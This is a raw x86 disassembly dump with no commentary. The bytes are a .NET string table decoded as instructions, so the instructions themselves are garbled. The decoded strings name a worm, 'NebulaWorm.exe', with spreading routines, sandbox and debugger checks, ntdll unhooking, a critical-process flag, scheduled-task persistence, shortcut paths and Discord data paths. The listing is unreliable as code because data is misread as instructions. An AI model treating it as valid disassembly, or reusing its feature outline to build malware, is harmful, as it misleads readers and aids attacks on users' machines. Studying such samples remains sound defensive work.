  4080c4:	6f                   	outsl  %ds:(%esi),(%dx)
  4080c5:	70 79                	jo     0x408140
  4080c7:	72 69                	jb     0x408132
  4080c9:	67 68 74 41 74 74    	addr16 push $0x74744174
  4080cf:	72 69                	jb     0x40813a
  4080d1:	62 75 74             	bound  %esi,0x74(%ebp)
  4080d4:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  4080d8:	73 65                	jae    0x40813f
  4080da:	6d                   	insl   (%dx),%es:(%edi)
  4080db:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  4080df:	6f                   	outsl  %ds:(%esi),(%dx)
  4080e0:	6d                   	insl   (%dx),%es:(%edi)
  4080e1:	70 61                	jo     0x408144
  4080e3:	6e                   	outsb  %ds:(%esi),(%dx)
  4080e4:	79 41                	jns    0x408127
  4080e6:	74 74                	je     0x40815c
  4080e8:	72 69                	jb     0x408153
  4080ea:	62 75 74             	bound  %esi,0x74(%ebp)
  4080ed:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  4080f1:	6e                   	outsb  %ds:(%esi),(%dx)
  4080f2:	74 69                	je     0x40815d
  4080f4:	6d                   	insl   (%dx),%es:(%edi)
  4080f5:	65 43                	gs inc %ebx
  4080f7:	6f                   	outsl  %ds:(%esi),(%dx)
  4080f8:	6d                   	insl   (%dx),%es:(%edi)
  4080f9:	70 61                	jo     0x40815c
  4080fb:	74 69                	je     0x408166
  4080fd:	62 69 6c             	bound  %ebp,0x6c(%ecx)
  408100:	69 74 79 41 74 74 72 	imul   $0x69727474,0x41(%ecx,%edi,2),%esi
  408107:	69 
  408108:	62 75 74             	bound  %esi,0x74(%ebp)
  40810b:	65 00 43 68          	add    %al,%gs:0x68(%ebx)
  40810f:	65 63 6b 41          	arpl   %ebp,%gs:0x41(%ebx)
  408113:	6e                   	outsb  %ds:(%esi),(%dx)
  408114:	64 45                	fs inc %ebp
  408116:	78 65                	js     0x40817d
  408118:	63 75 74             	arpl   %esi,0x74(%ebp)
  40811b:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  40811f:	74 5f                	je     0x408180
  408121:	55                   	push   %ebp
  408122:	73 65                	jae    0x408189
  408124:	53                   	push   %ebx
  408125:	68 65 6c 6c 45       	push   $0x456c6c65
  40812a:	78 65                	js     0x408191
  40812c:	63 75 74             	arpl   %esi,0x74(%ebp)
  40812f:	65 00 54 6f 42       	add    %dl,%gs:0x42(%edi,%ebp,2)
  408134:	79 74                	jns    0x4081aa
  408136:	65 00 44 65 6c       	add    %al,%gs:0x6c(%ebp,%eiz,2)
  40813b:	65 74 65             	gs je  0x4081a3
  40813e:	56                   	push   %esi
  40813f:	61                   	popa
  408140:	6c                   	insb   (%dx),%es:(%edi)
  408141:	75 65                	jne    0x4081a8
  408143:	00 47 65             	add    %al,0x65(%edi)
  408146:	74 56                	je     0x40819e
  408148:	61                   	popa
  408149:	6c                   	insb   (%dx),%es:(%edi)
  40814a:	75 65                	jne    0x4081b1
  40814c:	00 53 65             	add    %dl,0x65(%ebx)
  40814f:	74 56                	je     0x4081a7
  408151:	61                   	popa
  408152:	6c                   	insb   (%dx),%es:(%edi)
  408153:	75 65                	jne    0x4081ba
  408155:	00 52 65             	add    %dl,0x65(%edx)
  408158:	63 65 69             	arpl   %esp,0x69(%ebp)
  40815b:	76 65                	jbe    0x4081c2
  40815d:	00 49 73             	add    %cl,0x73(%ecx)
  408160:	48                   	dec    %eax
  408161:	6f                   	outsl  %ds:(%esi),(%dx)
  408162:	73 74                	jae    0x4081d8
  408164:	41                   	inc    %ecx
  408165:	6c                   	insb   (%dx),%es:(%edi)
  408166:	69 76 65 00 74 61 72 	imul   $0x72617400,0x65(%esi),%esi
  40816d:	67 65 74 45          	addr16 gs je 0x4081b6
  408171:	78 65                	js     0x4081d8
  408173:	00 4e 65             	add    %cl,0x65(%esi)
  408176:	62 75 6c             	bound  %esi,0x6c(%ebp)
  408179:	61                   	popa
  40817a:	57                   	push   %edi
  40817b:	6f                   	outsl  %ds:(%esi),(%dx)
  40817c:	72 6d                	jb     0x4081eb
  40817e:	2e 65 78 65          	cs js,pn 0x4081e7
  408182:	00 64 77 53          	add    %ah,0x53(%edi,%esi,2)
  408186:	74 61                	je     0x4081e9
  408188:	63 6b 53             	arpl   %ebp,0x53(%ebx)
  40818b:	69 7a 65 00 64 77 53 	imul   $0x53776400,0x65(%edx),%edi
  408192:	69 7a 65 00 73 69 7a 	imul   $0x7a697300,0x65(%edx),%edi
  408199:	65 00 50 69          	add    %dl,%gs:0x69(%eax)
  40819d:	6e                   	outsb  %ds:(%esi),(%dx)
  40819e:	67 00 53 79          	add    %dl,0x79(%bp,%di)
  4081a2:	73 74                	jae    0x408218
  4081a4:	65 6d                	gs insl (%dx),%es:(%edi)
  4081a6:	2e 54                	cs push %esp
  4081a8:	68 72 65 61 64       	push   $0x64616572
  4081ad:	69 6e 67 00 53 74 6f 	imul   $0x6f745300,0x67(%esi),%ebp
  4081b4:	70 53                	jo     0x408209
  4081b6:	70 72                	jo     0x40822a
  4081b8:	65 61                	gs popa
  4081ba:	64 69 6e 67 00 53 74 	imul   $0x61745300,%fs:0x67(%esi),%ebp
  4081c1:	61 
  4081c2:	72 74                	jb     0x408238
  4081c4:	53                   	push   %ebx
  4081c5:	70 72                	jo     0x408239
  4081c7:	65 61                	gs popa
  4081c9:	64 69 6e 67 00 50 65 	imul   $0x6e655000,%fs:0x67(%esi),%ebp
  4081d0:	6e 
  4081d1:	64 69 6e 67 00 45 6e 	imul   $0x636e4500,%fs:0x67(%esi),%ebp
  4081d8:	63 
  4081d9:	6f                   	outsl  %ds:(%esi),(%dx)
  4081da:	64 69 6e 67 00 49 73 	imul   $0x4c734900,%fs:0x67(%esi),%ebp
  4081e1:	4c 
  4081e2:	6f                   	outsl  %ds:(%esi),(%dx)
  4081e3:	67 67 69 6e 67 00 49 	addr16 imul $0x53734900,0x67(%bp),%ebp
  4081ea:	73 53 
  4081ec:	61                   	popa
  4081ed:	6e                   	outsb  %ds:(%esi),(%dx)
  4081ee:	64 62 6f 78          	bound  %ebp,%fs:0x78(%edi)
  4081f2:	53                   	push   %ebx
  4081f3:	65 72 76             	gs jb  0x40826c
  4081f6:	69 63 65 52 75 6e 6e 	imul   $0x6e6e7552,0x65(%ebx),%esp
  4081fd:	69 6e 67 00 69 73 52 	imul   $0x52736900,0x67(%esi),%ebp
  408204:	75 6e                	jne    0x408274
  408206:	6e                   	outsb  %ds:(%esi),(%dx)
  408207:	69 6e 67 00 49 73 44 	imul   $0x44734900,0x67(%esi),%ebp
  40820e:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  408212:	67 65 72 50          	addr16 gs jb 0x408266
  408216:	72 6f                	jb     0x408287
  408218:	63 65 73             	arpl   %esp,0x73(%ebp)
  40821b:	73 52                	jae    0x40826f
  40821d:	75 6e                	jne    0x40828d
  40821f:	6e                   	outsb  %ds:(%esi),(%dx)
  408220:	69 6e 67 00 72 75 6e 	imul   $0x6e757200,0x67(%esi),%ebp
  408227:	6e                   	outsb  %ds:(%esi),(%dx)
  408228:	69 6e 67 00 53 79 73 	imul   $0x73795300,0x67(%esi),%ebp
  40822f:	74 65                	je     0x408296
  408231:	6d                   	insl   (%dx),%es:(%edi)
  408232:	2e 52                	cs push %edx
  408234:	75 6e                	jne    0x4082a4
  408236:	74 69                	je     0x4082a1
  408238:	6d                   	insl   (%dx),%es:(%edi)
  408239:	65 2e 56             	gs cs push %esi
  40823c:	65 72 73             	gs jb  0x4082b2
  40823f:	69 6f 6e 69 6e 67 00 	imul   $0x676e69,0x6e(%edi),%ebp
  408246:	54                   	push   %esp
  408247:	6f                   	outsl  %ds:(%esi),(%dx)
  408248:	53                   	push   %ebx
  408249:	74 72                	je     0x4082bd
  40824b:	69 6e 67 00 67 65 74 	imul   $0x74656700,0x67(%esi),%ebp
  408252:	5f                   	pop    %edi
  408253:	51                   	push   %ecx
  408254:	75 65                	jne    0x4082bb
  408256:	72 79                	jb     0x4082d1
  408258:	53                   	push   %ebx
  408259:	74 72                	je     0x4082cd
  40825b:	69 6e 67 00 53 75 62 	imul   $0x62755300,0x67(%esi),%ebp
  408262:	73 74                	jae    0x4082d8
  408264:	72 69                	jb     0x4082cf
  408266:	6e                   	outsb  %ds:(%esi),(%dx)
  408267:	67 00 41 6e          	add    %al,0x6e(%bx,%di)
  40826b:	74 69                	je     0x4082d6
  40826d:	44                   	inc    %esp
  40826e:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  408272:	00 53 74             	add    %dl,0x74(%ebx)
  408275:	6f                   	outsl  %ds:(%esi),(%dx)
  408276:	70 77                	jo     0x4082ef
  408278:	61                   	popa
  408279:	74 63                	je     0x4082de
  40827b:	68 00 73 65 74       	push   $0x74657300
  408280:	5f                   	pop    %edi
  408281:	41                   	inc    %ecx
  408282:	75 74                	jne    0x4082f8
  408284:	6f                   	outsl  %ds:(%esi),(%dx)
  408285:	46                   	inc    %esi
  408286:	6c                   	insb   (%dx),%es:(%edi)
  408287:	75 73                	jne    0x4082fc
  408289:	68 00 67 65 74       	push   $0x74656700
  40828e:	5f                   	pop    %edi
  40828f:	50                   	push   %eax
  408290:	61                   	popa
  408291:	74 68                	je     0x4082fb
  408293:	00 47 65             	add    %al,0x65(%edi)
  408296:	74 44                	je     0x4082dc
  408298:	69 73 63 6f 72 64 4c 	imul   $0x4c64726f,0x63(%ebx),%esi
  40829f:	6f                   	outsl  %ds:(%esi),(%dx)
  4082a0:	63 61 6c             	arpl   %esp,0x6c(%ecx)
  4082a3:	41                   	inc    %ecx
  4082a4:	70 70                	jo     0x408316
  4082a6:	44                   	inc    %esp
  4082a7:	61                   	popa
  4082a8:	74 61                	je     0x40830b
  4082aa:	50                   	push   %eax
  4082ab:	61                   	popa
  4082ac:	74 68                	je     0x408316
  4082ae:	00 73 6f             	add    %dh,0x6f(%ebx)
  4082b1:	75 72                	jne    0x408325
  4082b3:	63 65 50             	arpl   %esp,0x50(%ebp)
  4082b6:	61                   	popa
  4082b7:	74 68                	je     0x408321
  4082b9:	00 72 65             	add    %dh,0x65(%edx)
  4082bc:	6d                   	insl   (%dx),%es:(%edi)
  4082bd:	6f                   	outsl  %ds:(%esi),(%dx)
  4082be:	74 65                	je     0x408325
  4082c0:	46                   	inc    %esi
  4082c1:	69 6c 65 50 61 74 68 	imul   $0x687461,0x50(%ebp,%eiz,2),%ebp
  4082c8:	00 
  4082c9:	67 65 74 5f          	addr16 gs je 0x40832c
  4082cd:	52                   	push   %edx
  4082ce:	65 6c                	gs insb (%dx),%es:(%edi)
  4082d0:	61                   	popa
  4082d1:	74 69                	je     0x40833c
  4082d3:	76 65                	jbe    0x40833a
  4082d5:	50                   	push   %eax
  4082d6:	61                   	popa
  4082d7:	74 68                	je     0x408341
  4082d9:	00 65 78             	add    %ah,0x78(%ebp)
  4082dc:	65 50                	gs push %eax
  4082de:	61                   	popa
  4082df:	74 68                	je     0x408349
  4082e1:	00 6c 6e 6b          	add    %ch,0x6b(%esi,%ebp,2)
  4082e5:	50                   	push   %eax
  4082e6:	61                   	popa
  4082e7:	74 68                	je     0x408351
  4082e9:	00 47 65             	add    %al,0x65(%edi)
  4082ec:	74 46                	je     0x408334
  4082ee:	75 6c                	jne    0x40835c
  4082f0:	6c                   	insb   (%dx),%es:(%edi)
  4082f1:	50                   	push   %eax
  4082f2:	61                   	popa
  4082f3:	74 68                	je     0x40835d
  4082f5:	00 47 65             	add    %al,0x65(%edi)
  4082f8:	74 54                	je     0x40834e
  4082fa:	65 6d                	gs insl (%dx),%es:(%edi)
  4082fc:	70 50                	jo     0x40834e
  4082fe:	61                   	popa
  4082ff:	74 68                	je     0x408369
  408301:	00 47 65             	add    %al,0x65(%edi)
  408304:	74 46                	je     0x40834c
  408306:	6f                   	outsl  %ds:(%esi),(%dx)
  408307:	6c                   	insb   (%dx),%es:(%edi)
  408308:	64 65 72 50          	fs gs jb 0x40835c
  40830c:	61                   	popa
  40830d:	74 68                	je     0x408377
  40830f:	00 66 6f             	add    %ah,0x6f(%esi)
  408312:	6c                   	insb   (%dx),%es:(%edi)
  408313:	64 65 72 50          	fs gs jb 0x408367
  408317:	61                   	popa
  408318:	74 68                	je     0x408382
  40831a:	00 74 61 72          	add    %dh,0x72(%ecx,%eiz,2)
  40831e:	67 65 74 50          	addr16 gs je 0x408372
  408322:	61                   	popa
  408323:	74 68                	je     0x40838d
  408325:	00 4d 61             	add    %cl,0x61(%ebp)
  408328:	6e                   	outsb  %ds:(%esi),(%dx)
  408329:	61                   	popa
  40832a:	67 65 6d             	gs insl (%dx),%es:(%di)
  40832d:	65 6e                	outsb  %gs:(%esi),(%dx)
  40832f:	74 50                	je     0x408381
  408331:	61                   	popa
  408332:	74 68                	je     0x40839c
  408334:	00 63 75             	add    %ah,0x75(%ebx)
  408337:	72 72                	jb     0x4083ab
  408339:	65 6e                	outsb  %gs:(%esi),(%dx)
  40833b:	74 50                	je     0x40838d
  40833d:	61                   	popa
  40833e:	74 68                	je     0x4083a8
  408340:	00 70 61             	add    %dh,0x61(%eax)
  408343:	74 68                	je     0x4083ad
  408345:	00 67 65             	add    %ah,0x65(%edi)
  408348:	74 5f                	je     0x4083a9
  40834a:	4c                   	dec    %esp
  40834b:	65 6e                	outsb  %gs:(%esi),(%dx)
  40834d:	67 74 68             	addr16 je 0x4083b8
  408350:	00 6c 65 6e          	add    %ch,0x6e(%ebp,%eiz,2)
  408354:	67 74 68             	addr16 je 0x4083bf
  408357:	00 53 74             	add    %dl,0x74(%ebx)
  40835a:	61                   	popa
  40835b:	72 74                	jb     0x4083d1
  40835d:	73 57                	jae    0x4083b6
  40835f:	69 74 68 00 53 6c 6f 	imul   $0x776f6c53,0x0(%eax,%ebp,2),%esi
  408366:	77 
  408367:	57                   	push   %edi
  408368:	69 00 55 6e 68 6f    	imul   $0x6f686e55,(%eax),%eax
  40836e:	6f                   	outsl  %ds:(%esi),(%dx)
  40836f:	6b 00 67             	imul   $0x67,(%eax),%eax
  408372:	65 74 5f             	gs je  0x4083d4
  408375:	54                   	push   %esp
  408376:	61                   	popa
  408377:	73 6b                	jae    0x4083e4
  408379:	00 43 72             	add    %al,0x72(%ebx)
  40837c:	65 61                	gs popa
  40837e:	74 65                	je     0x4083e5
  408380:	4f                   	dec    %edi
  408381:	72 55                	jb     0x4083d8
  408383:	70 64                	jo     0x4083e9
  408385:	61                   	popa
  408386:	74 65                	je     0x4083ed
  408388:	53                   	push   %ebx
  408389:	63 68 65             	arpl   %ebp,0x65(%eax)
  40838c:	64 75 6c             	fs jne 0x4083fb
  40838f:	65 64 54             	gs fs push %esp
  408392:	61                   	popa
  408393:	73 6b                	jae    0x408400
  408395:	00 4d 61             	add    %cl,0x61(%ebp)
  408398:	6b 65 43 72          	imul   $0x72,0x43(%ebp),%esp
  40839c:	69 74 69 63 61 6c 00 	imul   $0x52006c61,0x63(%ecx,%ebp,2),%esi
  4083a3:	52 
  4083a4:	65 6d                	gs insl (%dx),%es:(%edi)
  4083a6:	6f                   	outsl  %ds:(%esi),(%dx)
  4083a7:	76 65                	jbe    0x40840e
  4083a9:	43                   	inc    %ebx
  4083aa:	72 69                	jb     0x408415
  4083ac:	74 69                	je     0x408417
  4083ae:	63 61 6c             	arpl   %esp,0x6c(%ecx)
  4083b1:	00 62 49             	add    %ah,0x49(%edx)
  4083b4:	73 43                	jae    0x4083f9
  4083b6:	72 69                	jb     0x408421
  4083b8:	74 69                	je     0x408423
  4083ba:	63 61 6c             	arpl   %esp,0x6c(%ecx)
  4083bd:	00 52 74             	add    %dl,0x74(%edx)
  4083c0:	6c                   	insb   (%dx),%es:(%edi)
  4083c1:	53                   	push   %ebx
  4083c2:	65 74 50             	gs je  0x408415
  4083c5:	72 6f                	jb     0x408436
  4083c7:	63 65 73             	arpl   %esp,0x73(%ebp)
  4083ca:	73 49                	jae    0x408415
  4083cc:	73 43                	jae    0x408411
  4083ce:	72 69                	jb     0x408439
  4083d0:	74 69                	je     0x40843b
  4083d2:	63 61 6c             	arpl   %esp,0x6c(%ecx)
  4083d5:	00 4d 61             	add    %cl,0x61(%ebp)
  4083d8:	72 73                	jb     0x40844d
  4083da:	68 61 6c 00 53       	push   $0x53006c61
  4083df:	79 73                	jns    0x408454
  4083e1:	74 65                	je     0x408448
  4083e3:	6d                   	insl   (%dx),%es:(%edi)
  4083e4:	2e 53                	cs push %ebx
  4083e6:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  4083ea:	69 74 79 2e 50 72 69 	imul   $0x6e697250,0x2e(%ecx,%edi,2),%esi
  4083f1:	6e 
  4083f2:	63 69 70             	arpl   %ebp,0x70(%ecx)
  4083f5:	61                   	popa
  4083f6:	6c                   	insb   (%dx),%es:(%edi)
  4083f7:	00 57 69             	add    %dl,0x69(%edi)
  4083fa:	6e                   	outsb  %ds:(%esi),(%dx)
  4083fb:	64 6f                	outsl  %fs:(%esi),(%dx)
  4083fd:	77 73                	ja     0x408472
  4083ff:	50                   	push   %eax
  408400:	72 69                	jb     0x40846b
  408402:	6e                   	outsb  %ds:(%esi),(%dx)
  408403:	63 69 70             	arpl   %ebp,0x70(%ecx)
  408406:	61                   	popa
  408407:	6c                   	insb   (%dx),%es:(%edi)
  408408:	00 50 61             	add    %dl,0x61(%eax)
  40840b:	74 68                	je     0x408475
  40840d:	73 45                	jae    0x408454
  40840f:	71 75                	jno    0x408486
  408411:	61                   	popa
  408412:	6c                   	insb   (%dx),%es:(%edi)
  408413:	00 43 61             	add    %al,0x61(%ebx)
  408416:	6e                   	outsb  %ds:(%esi),(%dx)
  408417:	63 65 6c             	arpl   %esp,0x6c(%ebp)
  40841a:	00 6d 6f             	add    %ch,0x6f(%ebp)
  40841d:	64 65 6c             	fs gs insb (%dx),%es:(%edi)
  408420:	00 41 75             	add    %al,0x75(%ecx)
  408423:	74 68                	je     0x40848d
  408425:	65 6e                	outsb  %gs:(%esi),(%dx)
  408427:	74 69                	je     0x408492
  408429:	63 61 74             	arpl   %esp,0x74(%ecx)
  40842c:	69 6f 6e 4c 65 76 65 	imul   $0x6576654c,0x6e(%edi),%ebp
  408433:	6c                   	insb   (%dx),%es:(%edi)
  408434:	00 49 6d             	add    %cl,0x6d(%ecx)
  408437:	70 65                	jo     0x40849e
  408439:	72 73                	jb     0x4084ae
  40843b:	6f                   	outsl  %ds:(%esi),(%dx)
  40843c:	6e                   	outsb  %ds:(%esi),(%dx)
  40843d:	61                   	popa
  40843e:	74 69                	je     0x4084a9
  408440:	6f                   	outsl  %ds:(%esi),(%dx)
  408441:	6e                   	outsb  %ds:(%esi),(%dx)
  408442:	4c                   	dec    %esp
  408443:	65 76 65             	gs jbe 0x4084ab
  408446:	6c                   	insb   (%dx),%es:(%edi)
  408447:	00 57 68             	add    %dl,0x68(%edi)
  40844a:	65 6e                	outsb  %gs:(%esi),(%dx)
  40844c:	41                   	inc    %ecx
  40844d:	6c                   	insb   (%dx),%es:(%edi)
  40844e:	6c                   	insb   (%dx),%es:(%edi)
  40844f:	00 6b 65             	add    %ch,0x65(%ebx)
  408452:	72 6e                	jb     0x4084c2
  408454:	65 6c                	gs insb (%dx),%es:(%edi)
  408456:	33 32                	xor    (%edx),%esi
  408458:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  40845b:	6c                   	insb   (%dx),%es:(%edi)
  40845c:	00 75 73             	add    %dh,0x73(%ebp)
  40845f:	65 72 33             	gs jb  0x408495
  408462:	32 2e                	xor    (%esi),%ch
  408464:	64 6c                	fs insb (%dx),%es:(%edi)
  408466:	6c                   	insb   (%dx),%es:(%edi)
  408467:	00 6e 74             	add    %ch,0x74(%esi)
  40846a:	64 6c                	fs insb (%dx),%es:(%edi)
  40846c:	6c                   	insb   (%dx),%es:(%edi)
  40846d:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  408470:	6c                   	insb   (%dx),%es:(%edi)
  408471:	00 52 65             	add    %dl,0x65(%edx)
  408474:	73 74                	jae    0x4084ea
  408476:	6f                   	outsl  %ds:(%esi),(%dx)
  408477:	72 65                	jb     0x4084de
  408479:	4e                   	dec    %esi
  40847a:	74 64                	je     0x4084e0
  40847c:	6c                   	insb   (%dx),%es:(%edi)
  40847d:	6c                   	insb   (%dx),%es:(%edi)
  40847e:	00 4b 69             	add    %cl,0x69(%ebx)
  408481:	6c                   	insb   (%dx),%es:(%edi)
  408482:	6c                   	insb   (%dx),%es:(%edi)
  408483:	00 4e 65             	add    %cl,0x65(%esi)
  408486:	74 77                	je     0x4084ff
  408488:	6f                   	outsl  %ds:(%esi),(%dx)
  408489:	72 6b                	jb     0x4084f6
  40848b:	53                   	push   %ebx
  40848c:	74 72                	je     0x408500
  40848e:	65 61                	gs popa
  408490:	6d                   	insl   (%dx),%es:(%edi)
  408491:	00 47 65             	add    %al,0x65(%edi)
  408494:	74 53                	je     0x4084e9
  408496:	74 72                	je     0x40850a
  408498:	65 61                	gs popa
  40849a:	6d                   	insl   (%dx),%es:(%edi)
  40849b:	00 67 65             	add    %ah,0x65(%edi)
  40849e:	74 5f                	je     0x4084ff
  4084a0:	4f                   	dec    %edi
  4084a1:	75 74                	jne    0x408517
  4084a3:	70 75                	jo     0x40851a
  4084a5:	74 53                	je     0x4084fa
  4084a7:	74 72                	je     0x40851b
  4084a9:	65 61                	gs popa
  4084ab:	6d                   	insl   (%dx),%es:(%edi)
  4084ac:	00 50 72             	add    %dl,0x72(%eax)
  4084af:	6f                   	outsl  %ds:(%esi),(%dx)
  4084b0:	67 72 61             	addr16 jb 0x408514
  4084b3:	6d                   	insl   (%dx),%es:(%edi)
  4084b4:	00 67 65             	add    %ah,0x65(%edi)
  4084b7:	74 5f                	je     0x408518
  4084b9:	49                   	dec    %ecx
  4084ba:	74 65                	je     0x408521
  4084bc:	6d                   	insl   (%dx),%es:(%edi)
  4084bd:	00 73 65             	add    %dh,0x65(%ebx)
  4084c0:	74 5f                	je     0x408521
  4084c2:	49                   	dec    %ecx
  4084c3:	74 65                	je     0x40852a
  4084c5:	6d                   	insl   (%dx),%es:(%edi)
  4084c6:	00 53 79             	add    %dl,0x79(%ebx)
  4084c9:	73 74                	jae    0x40853f
  4084cb:	65 6d                	gs insl (%dx),%es:(%edi)
  4084cd:	00 53 65             	add    %dl,0x65(%ebx)
  4084d0:	6d                   	insl   (%dx),%es:(%edi)
  4084d1:	61                   	popa
  4084d2:	70 68                	jo     0x40853c
  4084d4:	6f                   	outsl  %ds:(%esi),(%dx)
  4084d5:	72 65                	jb     0x40853c
  4084d7:	53                   	push   %ebx
  4084d8:	6c                   	insb   (%dx),%es:(%edi)
  4084d9:	69 6d 00 52 61 6e 64 	imul   $0x646e6152,0x0(%ebp),%ebp
  4084e0:	6f                   	outsl  %ds:(%esi),(%dx)
  4084e1:	6d                   	insl   (%dx),%es:(%edi)
  4084e2:	00 4e 65             	add    %cl,0x65(%esi)
  4084e5:	62 75 6c             	bound  %esi,0x6c(%ebp)
  4084e8:	61                   	popa
  4084e9:	57                   	push   %edi
  4084ea:	6f                   	outsl  %ds:(%esi),(%dx)
  4084eb:	72 6d                	jb     0x40855a
  4084ed:	00 76 6d             	add    %dh,0x6d(%esi)
  4084f0:	00 6f 70             	add    %ch,0x70(%edi)
  4084f3:	5f                   	pop    %edi
  4084f4:	4c                   	dec    %esp
  4084f5:	65 73 73             	gs jae 0x40856b
  4084f8:	54                   	push   %esp
  4084f9:	68 61 6e 00 54       	push   $0x54006e61
  4084fe:	69 6d 65 53 70 61 6e 	imul   $0x6e617053,0x65(%ebp),%ebp
  408505:	00 67 65             	add    %ah,0x65(%edi)
  408508:	74 5f                	je     0x408569
  40850a:	54                   	push   %esp
  40850b:	6f                   	outsl  %ds:(%esi),(%dx)
  40850c:	6b 65 6e 00          	imul   $0x0,0x6e(%ebp),%esp
  408510:	43                   	inc    %ebx
  408511:	61                   	popa
  408512:	6e                   	outsb  %ds:(%esi),(%dx)
  408513:	63 65 6c             	arpl   %esp,0x6c(%ebp)
  408516:	6c                   	insb   (%dx),%es:(%edi)
  408517:	61                   	popa
  408518:	74 69                	je     0x408583
  40851a:	6f                   	outsl  %ds:(%esi),(%dx)
  40851b:	6e                   	outsb  %ds:(%esi),(%dx)
  40851c:	54                   	push   %esp
  40851d:	6f                   	outsl  %ds:(%esi),(%dx)
  40851e:	6b 65 6e 00          	imul   $0x0,0x6e(%ebp),%esp
  408522:	74 6f                	je     0x408593
  408524:	6b 65 6e 00          	imul   $0x0,0x6e(%ebp),%esp
  408528:	49                   	dec    %ecx
  408529:	73 50                	jae    0x40857b
  40852b:	6f                   	outsl  %ds:(%esi),(%dx)
  40852c:	72 74                	jb     0x4085a2
  40852e:	4f                   	dec    %edi
  40852f:	70 65                	jo     0x408596
  408531:	6e                   	outsb  %ds:(%esi),(%dx)
  408532:	00 4c 69 73          	add    %cl,0x73(%ecx,%ebp,2)
  408536:	74 65                	je     0x40859d
  408538:	6e                   	outsb  %ds:(%esi),(%dx)
  408539:	00 6c 70 4e          	add    %ch,0x4e(%eax,%esi,2)
  40853d:	75 6d                	jne    0x4085ac
  40853f:	62 65 72             	bound  %esp,0x72(%ebp)
  408542:	4f                   	dec    %edi
  408543:	66 42                	inc    %dx
  408545:	79 74                	jns    0x4085bb
  408547:	65 73 57             	gs jae 0x4085a1
  40854a:	72 69                	jb     0x4085b5
  40854c:	74 74                	je     0x4085c2
  40854e:	65 6e                	outsb  %gs:(%esi),(%dx)
  408550:	00 42 79             	add    %al,0x79(%edx)
  408553:	70 61                	jo     0x4085b6
  408555:	73 73                	jae    0x4085ca
  408557:	57                   	push   %edi
  408558:	69 6e 00 4d 61 69 6e 	imul   $0x6e69614d,0x0(%esi),%ebp
  40855f:	00 4a 6f             	add    %cl,0x6f(%edx)
  408562:	69 6e 00 73 65 74 5f 	imul   $0x5f746573,0x0(%esi),%ebp
  408569:	41                   	inc    %ecx
  40856a:	75 74                	jne    0x4085e0
  40856c:	68 65 6e 74 69       	push   $0x69746e65
  408571:	63 61 74             	arpl   %esp,0x74(%ecx)
  408574:	69 6f 6e 00 53 79 73 	imul   $0x73795300,0x6e(%edi),%ebp
  40857b:	74 65                	je     0x4085e2
  40857d:	6d                   	insl   (%dx),%es:(%edi)
  40857e:	2e 4e                	cs dec %esi
  408580:	65 74 2e             	gs je  0x4085b1
  408583:	4e                   	dec    %esi
  408584:	65 74 77             	gs je  0x4085fe
  408587:	6f                   	outsl  %ds:(%esi),(%dx)
  408588:	72 6b                	jb     0x4085f5
  40858a:	49                   	dec    %ecx
  40858b:	6e                   	outsb  %ds:(%esi),(%dx)
  40858c:	66 6f                	outsw  %ds:(%esi),(%dx)
  40858e:	72 6d                	jb     0x4085fd
  408590:	61                   	popa
  408591:	74 69                	je     0x4085fc
  408593:	6f                   	outsl  %ds:(%esi),(%dx)
  408594:	6e                   	outsb  %ds:(%esi),(%dx)
  408595:	00 73 65             	add    %dh,0x65(%ebx)
  408598:	74 5f                	je     0x4085f9
  40859a:	49                   	dec    %ecx
  40859b:	6d                   	insl   (%dx),%es:(%edi)
  40859c:	70 65                	jo     0x408603
  40859e:	72 73                	jb     0x408613
  4085a0:	6f                   	outsl  %ds:(%esi),(%dx)
  4085a1:	6e                   	outsb  %ds:(%esi),(%dx)
  4085a2:	61                   	popa
  4085a3:	74 69                	je     0x40860e
  4085a5:	6f                   	outsl  %ds:(%esi),(%dx)
  4085a6:	6e                   	outsb  %ds:(%esi),(%dx)
  4085a7:	00 53 65             	add    %dl,0x65(%ebx)
  4085aa:	63 75 72             	arpl   %esi,0x72(%ebp)
  4085ad:	69 74 79 41 63 74 69 	imul   $0x6f697463,0x41(%ecx,%edi,2),%esi
  4085b4:	6f 
  4085b5:	6e                   	outsb  %ds:(%esi),(%dx)
  4085b6:	00 6f 70             	add    %ch,0x70(%edi)
  4085b9:	5f                   	pop    %edi
  4085ba:	53                   	push   %ebx
  4085bb:	75 62                	jne    0x40861f
  4085bd:	74 72                	je     0x408631
  4085bf:	61                   	popa
  4085c0:	63 74 69 6f          	arpl   %esi,0x6f(%ecx,%ebp,2)
  4085c4:	6e                   	outsb  %ds:(%esi),(%dx)
  4085c5:	00 53 79             	add    %dl,0x79(%ebx)
  4085c8:	73 74                	jae    0x40863e
  4085ca:	65 6d                	gs insl (%dx),%es:(%edi)
  4085cc:	2e 52                	cs push %edx
  4085ce:	65 66 6c             	gs data16 insb (%dx),%es:(%edi)
  4085d1:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4085d6:	6e                   	outsb  %ds:(%esi),(%dx)
  4085d7:	00 4e 61             	add    %cl,0x61(%esi)
  4085da:	6d                   	insl   (%dx),%es:(%edi)
  4085db:	65 56                	gs push %esi
  4085dd:	61                   	popa
  4085de:	6c                   	insb   (%dx),%es:(%edi)
  4085df:	75 65                	jne    0x408646
  4085e1:	43                   	inc    %ebx
  4085e2:	6f                   	outsl  %ds:(%esi),(%dx)
  4085e3:	6c                   	insb   (%dx),%es:(%edi)
  4085e4:	6c                   	insb   (%dx),%es:(%edi)
  4085e5:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4085ea:	6e                   	outsb  %ds:(%esi),(%dx)
  4085eb:	00 4d 61             	add    %cl,0x61(%ebp)
  4085ee:	6e                   	outsb  %ds:(%esi),(%dx)
  4085ef:	61                   	popa
  4085f0:	67 65 6d             	gs insl (%dx),%es:(%di)
  4085f3:	65 6e                	outsb  %gs:(%esi),(%dx)
  4085f5:	74 4f                	je     0x408646
  4085f7:	62 6a 65             	bound  %ebp,0x65(%edx)
  4085fa:	63 74 43 6f          	arpl   %esi,0x6f(%ebx,%eax,2)
